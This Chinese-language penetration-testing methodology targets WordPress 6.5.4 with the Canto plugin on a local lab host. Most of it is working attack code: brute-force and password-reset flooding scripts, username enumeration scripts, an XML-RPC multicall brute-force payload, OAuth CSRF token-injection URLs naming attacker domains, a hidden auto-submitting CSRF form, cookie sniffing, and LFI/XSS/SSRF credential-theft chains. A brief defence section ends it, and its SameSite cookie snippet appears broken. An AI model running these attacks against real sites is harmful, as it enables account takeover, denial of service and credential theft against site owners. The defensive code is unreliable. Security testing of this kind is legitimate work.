# WordPress 认证系统攻击方法论

## 1. 技术介绍

### 1.1 漏洞原理

WordPress 6.5.4 应用的认证机制存在多个严重缺陷：
- **无速率限制**：登录和密碼重置端点无任何限流措施
- **账户枚举**：错误消息和作者归档泄露有效用户名
- **会话 Cookie 配置缺陷**：缺少 SameSite 属性，Secure 标志动态设置
- **OAuth CSRF**：Canto 插件 OAuth 流程缺少 state 参数验证

### 1.2 受影响组件

| 组件 | 端点 | 漏洞类型 | 认证要求 |
|-----|------|---------|---------|
| WordPress 登录 | `/wp-login.php` | 暴力破解、账户枚举 | 无 |
| 密码重置 | `/wp-login.php?action=lostpassword` | 邮件轰炸、账户枚举 | 无 |
| 作者归档 | `/?author={id}` | 用户名枚举 | 无 |
| Canto OAuth | `/wp-admin/options-general.php?page=canto_settings` | OAuth CSRF | 管理员 |
| XML-RPC | `/xmlrpc.php` | 暴力破解放大 | 无 |

---

## 2. 攻击场景

### 2.1 暴力破解攻击

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **管理员登录** | POST /wp-login.php | 无速率限制，可无限尝试密码 |
| **XML-RPC 认证** | system.multicall | 单次请求尝试多个凭证 |
| **密码重置** | lostpassword 端点 | 无限制触发重置邮件 |

### 2.2 账户枚举

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **登录错误消息** | 区分"用户不存在"和"密码错误" | 确认有效用户名 |
| **密码重置响应** | 不同用户返回不同错误 | 确认用户存在 |
| **作者归档重定向** | `/?author=1` 重定向到 `/author/username/` | 直接暴露用户名 |

### 2.3 会话攻击

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **Cookie 拦截** | HTTP 明文传输 | 无 TLS，Cookie 可被嗅探 |
| **CSRF 攻击** | 缺少 SameSite 属性 | 跨站请求伪造 |
| **会话固定** | 登录后 Session ID 不变 | 会话固定攻击 |

---

## 3. 漏洞探测方法

### 3.1 暴力破解探测

#### 3.1.1 登录端点速率限制测试

```bash
#!/bin/bash
# 暴力破解测试脚本

TARGET="http://localhost:35995/wp-login.php"
USERNAME="wordpress_admin"
PASSWORDS=("admin" "password" "Password123" "wordpress" "admin123")

for pwd in "${PASSWORDS[@]}"; do
    start_time=$(date +%s.%N)
    
    response=$(curl -s -X POST "$TARGET" \
        -d "log=$USERNAME&pwd=$pwd&wp-submit=Log+In" \
        -c /tmp/cookies.txt \
        -w "%{http_code}")
    
    end_time=$(date +%s.%N)
    duration=$(echo "$end_time - $start_time" | bc)
    
    if [[ "$response" == *"password you entered"* ]]; then
        echo "Attempt $pwd: FAILED (${duration}s)"
    else
        echo "SUCCESS: $pwd (${duration}s)"
        break
    fi
done
```

#### 3.1.2 密码重置滥用测试

```bash
#!/bin/bash
# 密码重置 DoS 测试

TARGET="http://localhost:35995/wp-login.php?action=lostpassword"
USERNAME="wordpress_admin"

start_time=$(date +%s.%N)

for i in {1..20}; do
    response=$(curl -s -X POST "$TARGET" \
        -d "user_login=$USERNAME" \
        -w "%{http_code}")
    
    if [[ "$response" == "200" ]] || [[ "$response" == "302" ]]; then
        echo "Request $i: PROCESSED"
    else
        echo "Request $i: BLOCKED"
    fi
done

end_time=$(date +%s.%N)
duration=$(echo "$end_time - $start_time" | bc)
rate=$(echo "scale=2; 20 / $duration" | bc)

echo "Total: 20 requests in ${duration}s (${rate} req/sec)"
```

### 3.2 账户枚举探测

#### 3.2.1 登录错误消息枚举

```bash
# 测试不存在的用户
curl -s -X POST "http://localhost:35995/wp-login.php" \
    -d "log=nonexistentuser12345&pwd=anypassword" \
    | grep -Eo '(not registered|password you entered)'
# 响应：not registered

# 测试存在的用户
curl -s -X POST "http://localhost:35995/wp-login.php" \
    -d "log=wordpress_admin&pwd=wrongpassword" \
    | grep -Eo '(not registered|password you entered)'
# 响应：password you entered
```

#### 3.2.2 作者归档枚举

```bash
#!/bin/bash
# 作者用户名枚举脚本

TARGET="http://localhost:35995"

for id in {1..20}; do
    response=$(curl -s -I "$TARGET/?author=$id" | grep Location)
    
    if [[ -n "$response" ]]; then
        username=$(echo "$response" | grep -oP '/author/\K[^/]+')
        echo "Author ID $id: $username"
    fi
done
```

### 3.3 OAuth CSRF 探测

```bash
# 测试 OAuth state 参数验证
curl -i "http://localhost:35995/wp-admin/options-general.php?page=canto_settings&token=FAKE_TOKEN&domain=attacker.canto.com&refreshToken=FAKE&app_api=canto.com"

# 如果未验证 state 参数，直接存储 token
# 检查数据库 wp_options 表：
# SELECT * FROM wp_options WHERE option_name IN ('fbc_app_token', 'fbc_refresh_token');
```

---

## 4. 漏洞利用方法

### 4.1 暴力破解攻击

#### 4.1.1 单用户暴力破解

```bash
# 使用已知用户名进行暴力破解
curl -X POST "http://localhost:35995/wp-login.php" \
    -d "log=wordpress_admin&pwd=password1" \
    -c cookies.txt

# 如果登录成功，会设置 wordpress_logged_in_* Cookie
# 检查 Cookie 文件确认是否成功
```

#### 4.1.2 XML-RPC 暴力破解放大

```xml
<!-- xmlrpc_bruteforce.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>system.multicall</methodName>
<params>
<param>
<array>
    <data>
    <!-- 单次请求尝试 10 个密码 -->
    <value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>wordpress_admin</string></value><value><string>password1</string></value></data></array></value></member></struct></value>
    <value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>wordpress_admin</string></value><value><string>password2</string></value></data></array></value></member></struct></value>
    <!-- 重复 10 次... -->
    </data>
</array>
</param>
</params>
</methodCall>
```

```bash
# 发送 XML-RPC 暴力破解请求
curl -X POST "http://localhost:35995/xmlrpc.php" \
    -H "Content-Type: text/xml" \
    --data @xmlrpc_bruteforce.xml
```

### 4.2 账户枚举攻击

#### 4.2.1 完整用户名枚举脚本

```bash
#!/bin/bash
# WordPress 用户名枚举完整脚本

TARGET="http://localhost:35995"
OUTPUT_FILE="enumerated_users.txt"

echo "=== WordPress User Enumeration ===" > $OUTPUT_FILE

# 方法 1：作者归档枚举
echo "[Method 1: Author Archive]" >> $OUTPUT_FILE
for id in {1..100}; do
    response=$(curl -s -I "$TARGET/?author=$id" | grep Location)
    if [[ -n "$response" ]]; then
        username=$(echo "$response" | grep -oP '/author/\K[^/]+')
        echo "Author ID $id: $username" >> $OUTPUT_FILE
    fi
done

# 方法 2：REST API 枚举（如果启用）
echo "[Method 2: REST API]" >> $OUTPUT_FILE
curl -s "$TARGET/wp-json/wp/v2/users" | jq -r '.[].slug' >> $OUTPUT_FILE 2>/dev/null

# 方法 3：登录错误消息枚举（需要已知用户名列表）
echo "[Method 3: Login Error Messages]" >> $OUTPUT_FILE
for user in admin administrator root test; do
    response=$(curl -s -X POST "$TARGET/wp-login.php" \
        -d "log=$user&pwd=test")
    
    if [[ "$response" != *"not registered"* ]]; then
        echo "Valid user: $user" >> $OUTPUT_FILE
    fi
done

echo "Enumeration complete. Results saved to $OUTPUT_FILE"
```

### 4.3 OAuth CSRF 攻击

#### 4.3.1 构造恶意 OAuth 回调

```bash
# 攻击者发起自己的 OAuth 流程，获取 token
# 然后构造恶意回调 URL 诱骗管理员访问

MALICIOUS_URL="http://localhost:35995/wp-admin/options-general.php?page=canto_settings&token=ATTACKER_TOKEN&refreshToken=ATTACKER_REFRESH&domain=attacker.canto.com&app_api=canto.com"

# 通过钓鱼邮件或 XSS 让管理员访问该 URL
# 管理员访问后，WordPress 会存储攻击者的 OAuth token
```

#### 4.3.2 OAuth Token 注入

```bash
# 如果管理员已登录，访问恶意 URL 会存储攻击者的 token
curl -b "wordpress_logged_in_...=ADMIN_SESSION" \
    "http://localhost:35995/wp-admin/options-general.php?page=canto_settings&token=FAKE_TOKEN&domain=evil.canto.com&refreshToken=FAKE&app_api=evil.com"

# 验证 token 已存储
mysql -u wp_user -p wordpress -e "SELECT * FROM wp_options WHERE option_name IN ('fbc_app_token', 'fbc_refresh_token', 'fbc_flight_domain', 'fbc_app_api');"
```

### 4.4 会话劫持

#### 4.4.1 网络嗅探会话 Cookie

```bash
# 在 HTTP-only 部署中，Cookie 明文传输
# 使用 tcpdump 捕获 Cookie

tcpdump -i eth0 -A 'tcp port 35995 and host victim-ip' -w capture.pcap

# 使用 Wireshark 分析
wireshark capture.pcap
# 过滤：http.cookie contains "wordpress"
```

#### 4.4.2 CSRF 攻击

```html
<!-- csrf_attack.html -->
<!DOCTYPE html>
<html>
<head><title>Innocent Page</title></head>
<body>
    <h1>Welcome!</h1>
    
    <!-- 隐藏 CSRF 表单 -->
    <iframe style="display:none" name="csrf-frame"></iframe>
    <form id="csrf-form"
          action="http://localhost:35995/wp-admin/admin-ajax.php"
          method="POST"
          target="csrf-frame"
          style="display:none">
        <input type="hidden" name="action" value="updateOptions">
        <input type="hidden" name="duplicates" value="1">
        <input type="hidden" name="cron" value="1">
        <input type="hidden" name="schedule" value="hourly">
    </form>
    
    <script>
        // 自动提交 CSRF 表单
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        };
    </script>
</body>
</html>
```

---

## 5. 绕过方法

### 5.1 绕过账户锁定

由于 WordPress 默认无账户锁定机制，无需绕过。

### 5.2 绕过速率限制

由于 WordPress 默认无速率限制，无需绕过。

### 5.3 绕过 CSRF 保护

#### 5.3.1 缺少 SameSite Cookie

```bash
# WordPress Cookie 缺少 SameSite 属性
# 浏览器会自动发送跨站 Cookie

# 攻击者网站可以触发对 WordPress 的认证请求
# Cookie 会自动附加到请求中
```

#### 5.3.2 利用缺失的 Nonce 验证

```bash
# Canto 插件 AJAX 端点缺少 nonce 验证
# 可以直接调用

curl -X POST "http://localhost:35995/wp-admin/admin-ajax.php" \
    -b "wordpress_logged_in_...=..." \
    -d "action=updateOptions&duplicates=1&cron=1"
```

### 5.4 绕过 OAuth State 验证

由于 Canto 插件完全不验证 state 参数，无需绕过。

---

## 6. 渗透测试决策流程

```
开始认证测试
    │
    ▼
识别认证机制
    │
    ├── WordPress Cookie 认证
    ├── OAuth 集成
    └── XML-RPC 认证
    │
    ▼
测试速率限制
    │
    ├── 登录端点
    ├── 密码重置
    └── 注册端点
    │
    ▼
测试账户枚举
    │
    ├── 错误消息分析
    ├── 作者归档
    └── REST API
    │
    ▼
测试会话管理
    │
    ├── Cookie 标志检查
    ├── 会话固定
    └── CSRF 测试
    │
    ▼
测试 OAuth 流程
    │
    ├── State 验证
    ├── Redirect URI 验证
    └── Token 验证
    │
    ▼
深度利用
    │
    ├── 暴力破解
    ├── 会话劫持
    └── OAuth CSRF
```

---

## 7. 常用 Payload 速查表

| 类别 | 目标/环境 | Payload 示例 | 说明 |
|-----|---------|------------|------|
| **暴力破解** | 登录端点 | `log=admin&pwd=password` | 尝试常见密码 |
| **暴力破解** | XML-RPC | `system.multicall` | 批量认证尝试 |
| **账户枚举** | 作者归档 | `/?author=1` | 枚举用户名 |
| **账户枚举** | 登录错误 | 区分"not registered"和"password incorrect" | 确认用户存在 |
| **密码重置 DoS** | lostpassword | `user_login=victim` | 邮件轰炸 |
| **OAuth CSRF** | Canto 回调 | `?token=ATTACKER_TOKEN&domain=evil.canto.com` | 劫持 OAuth |
| **CSRF** | admin-ajax.php | 隐藏表单自动提交 | 跨站请求伪造 |
| **会话劫持** | Cookie 嗅探 | `wordpress_logged_in_*=...` | 网络拦截 |

---

## 8. WordPress 特定场景

### 8.1 结合 LFI 攻击

```
1. 通过 LFI 读取 wp-config.php 获取数据库凭证
2. 连接数据库查询用户表
3. 获取所有用户名和 password hash
4. 对 hash 进行离线暴力破解
5. 使用破解的密码登录
```

### 8.2 结合 XSS 攻击

```
1. 通过 XSS 窃取管理员 Cookie
2. 使用窃取的 Cookie 访问管理功能
3. 创建新的管理员账户
4. 持久化访问
```

### 8.3 结合 SSRF 攻击

```
1. 通过 SSRF 访问云元数据服务
2. 获取 IAM 凭证
3. 使用凭证访问云资源
4. 获取 WordPress 备份文件
5. 提取数据库凭证
```

---

## 9. 防御建议

### 9.1 代码层修复

```php
// 添加速率限制
function limit_login_attempts() {
    $transient = get_transient('login_attempts_' . $_SERVER['REMOTE_ADDR']);
    if ($transient >= 5) {
        wp_die('Too many login attempts');
    }
    set_transient('login_attempts_' . $_SERVER['REMOTE_ADDR'], $transient + 1, 300);
}
add_action('login_init', 'limit_login_attempts');

// 添加 SameSite Cookie 属性
add_filter('cookie_path', function($path) {
    header('Set-Cookie: ' . session_name() . '=' . session_id() . '; SameSite=Strict');
});

// 验证 OAuth State
$state = bin2hex(random_bytes(32));
update_option('oauth_state', $state);

// 在回调时验证
if ($_REQUEST['state'] !== get_option('oauth_state')) {
    wp_die('Invalid OAuth state');
}
```

### 9.2 配置层修复

```apache
# .htaccess 配置
# 禁用作者归档
RewriteRule ^index.php/author/.*$ /index.php [L]

# 禁用 XML-RPC
<Files xmlrpc.php>
Order Deny,Allow
Deny from all
</Files>
```

---

**文档版本：** 1.0  
**最后更新：** 2025-10-29  
**适用目标：** WordPress 6.5.4 + Canto DAM 插件 v3.0.4  
**关联漏洞：** AUTH-VULN-01 至 AUTH-VULN-08
